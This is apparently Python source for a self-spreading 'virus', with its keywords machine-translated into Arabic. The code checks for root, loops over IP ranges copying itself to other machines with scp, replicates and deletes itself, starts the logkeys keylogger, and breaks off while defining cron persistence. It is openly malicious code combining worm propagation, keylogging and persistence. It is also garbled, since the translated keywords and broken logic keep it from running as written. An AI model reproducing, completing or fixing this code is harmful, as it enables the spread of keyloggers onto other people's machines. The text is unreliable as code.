
استيراد os، sys من استيراد عشوائي randint import datetime من وقت استيراد وقت استيراد socket def check_sudo(): os.system("havesudo=$(id -u)") إذا كان hassudo! = 0: print("يجب تشغيل هذا الفيروس بامتيازات الجذر. يرجى التشغيل مرة أخرى.") sys.exit() def generate_file_name(): aRandom = randint(1111, 9999) bRandom = randint(1111, 9999) aFilename = "run_" + str(aRandom) + "_" + str(bRandom) + ".py" return aFilename def propagate_via_network(): cIP = socket.gethostbyname(socket.gethostname()) for i in range(0, 255): for m in range(0, 255): aIP = cIP = cIP.split(".")[ 0] + "." + cIP.split(".")[ 1] + \ "." + str(int(cIP.split(".")[2]) + i) + \ "." + str(int(cIP.split(".")[3]) + m) aCopy = generate_file_name() os.system("cp %s ~/" + aCopy) os.system("scp ~/" + aCopy + aIP + ":~/") def replicate_self(): aCopy = generate_file_name() os.system("cp %s ~/" + aCopy) def delete_original_file(): os.system("rm %s" % sys.argv[0]) print("File deletion successful - original file has been removed") def send_keystrokes_to_server(): timestamp = datetime.datetime.now().strftime("%m-%d-%Y %H:%M:%S") os.system("logkeys --start -o ~/keylogs.log >> /dev/null") def schedule_cron_jobs(): os
